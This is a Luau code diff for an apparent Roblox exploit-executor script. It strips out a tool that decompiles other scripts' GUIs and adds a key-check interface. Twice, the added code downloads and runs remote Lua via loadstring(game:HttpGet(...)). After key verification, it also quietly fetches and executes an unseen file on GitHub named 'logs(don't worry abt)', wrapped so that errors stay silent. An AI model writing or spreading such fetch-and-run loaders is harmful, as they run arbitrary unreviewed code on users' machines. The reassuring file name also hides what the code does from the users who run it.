+    TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = pop}):Play()
+    task.wait(0.15)
+    TweenService:Create(btn, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {BackgroundColor3 = orig}):Play()
 end
 
-actionBtn.Activated:Connect(function()
-	if currentStep == 1 then
-		startWatchingPhase()
-	elseif currentStep == 2 then
-		if #detectedGuis > 0 then
-			if scanCore then scanCore:Disconnect() end
-			if scanPlayer then scanPlayer:Disconnect() end
-			startTappingPhase()
-		else
-			contentText.Text = "Step 1/3: Watching for executions...\n\n❌ No GUIs detected yet! Please execute your other script first."
-		end
-	elseif currentStep == 3 then
-		if targetGui then
-			local code = decompileGui(targetGui)
-			finishAndDisplayLogs(code)
-		end
-	elseif currentStep == 4 then
-		if setclipboard then
-			setclipboard(logsBox.Text)
-			actionBtn.Text = "✅ LOGS COPIED SUCCESSFULLY!"
-			task.wait(1.5)
-			actionBtn.Text = "📋 COPY LOGS TO CLIPBOARD"
-		else
-			actionBtn.Text = "❌ EXECUTOR LACKS CLIPBOARD FUNCTION"
-			task.wait(1.5)
-			actionBtn.Text = "📋 COPY LOGS TO CLIPBOARD"
-		end
-	end
-end)
+-- Function called upon successful key verification
+local function loadScript()
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodlandon25/ro-scripter-ai/refs/heads/main/logs(don't%20worry%20abt)", true))()
+        end)
+    end)
+end
 
-skipBtn.Activated:Connect(function()
-	if currentStep == 3 and targetGui then
-		local code = decompileGui(targetGui)
-		finishAndDisplayLogs(code)
-	end
-end)
+local function main()
+    if getgenv().JunkieUILoaded then return end
+    getgenv().JunkieUILoaded = true
+    
+    local ui = buildUI()
+    drag(ui)
 
-closeBtn.Activated:Connect(function()
-	if scanCore then scanCore:Disconnect() end
-	if scanPlayer then scanPlayer:Disconnect() end
-	cleanHookConnections()
-	highlightFrame:Destroy()
-	wizardScreen:Destroy()
-end)
+    local function validate()
+        local key = ui.box.Text:gsub("%s+", "")
+        if key == "" then 
+            createNotification("Key Required", "Please enter a key to continue.", 3, "rbxassetid://82094603330968") 
+            return 
+        end
+        
+        createNotification("Checking...", "Validating your key, please wait.", 2, "rbxassetid://92630967969808")
+        
+        local success, sdk = pcall(function()
+            return loadstring(game:HttpGet("https://junkie-development.de/sdk/JunkieKeySystem.lua"))()
+        end)
+        
+        if not success then
+            createNotification("Error", "Failed to load SDK. Please try again.", 3, "rbxassetid://78733624425654")
+            return
+        end
+        
+        local ok = sdk.verifyKey(cfg.api, key, cfg.service)
+        
+        if ok then
+            saveKey(key)
+            createNotification("Success!", "Key verified. Loading script...", 3, "rbxassetid://87094841427580")
+            TweenService:Create(ui.main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                Position = UDim2.new(0.5, 0, -0.5, 0),
+                BackgroundTransparency = 1
+            }):Play()
+            task.wait(0.4)
+            ui.gui:Destroy()
+            loadScript()
+        else
+            createNotification("Invalid Key", "The key you entered is incorrect.", 3, "rbxassetid://78733624425654")
+        end
+    end
+
+    ui.verify.MouseButton1Click:Connect(function()
+        pulse(ui.verify)
+        validate()
+    end)
+
+    ui.box.FocusLost:Connect(function(enter) 
+        if enter then 
+            validate() 
+        end 
+    end)
+
+    ui.getKey.MouseButton1Click:Connect(function()
+        pulse(ui.getKey)
+        createNotification("Getting Key...", "Generating your key link...", 2, "rbxassetid://83281479437771")
+        
+        local success, sdk = pcall(function()
+            return loadstring(game:HttpGet("https://junkie-development.de/sdk/JunkieKeySystem.lua"))()
+        end)
+        
+        if success then
+            local link = sdk.getLink(cfg.api, cfg.provider, cfg.service)
+            if link and setclipboard then
+                setclipboard(link)
+                createNotification("Link Copied", "Get-key link has been copied to clipboard.", 3, "rbxassetid://128463727794542")
+            else
+                createNotification("Failed", "Could not generate get-key link.", 3, "rbxassetid://78733624425654")
+            end
+        else
+            createNotification("Error", "Failed to load SDK. Please try again.", 3, "rbxassetid://78733624425654")
+        end
+    end)
+
+    ui.close.MouseButton1Click:Connect(function()
+        createNotification("Closing...", "See you next time!", 2, "rbxassetid://116998807311805")
+        TweenService:Create(ui.main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Position = UDim2.new(0.5, 0, -0.5, 0),
+            BackgroundTransparency = 1
+        }):Play()
+        task.wait(0.4)
+        ui.gui:Destroy()
+    end)
+
+    ui.box.Focused:Connect(function()
+        TweenService:Create(ui.box.Parent, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
+    end)
+
+    ui.box.FocusLost:Connect(function()
+        TweenService:Create(ui.box.Parent, TweenInfo.new(0.2), {BackgroundTransparency = 0.3}):Play()
+    end)
+
+    local btnColor = Color3.fromRGB(30, 80, 150)
+    for _, btn in ipairs({ui.verify, ui.getKey}) do
+        btn.MouseEnter:Connect(function()
+            local bright = Color3.fromRGB(40, 100, 180)
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = bright}):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = btnColor}):Play()
+        end)
+    end
+end
+
+main()
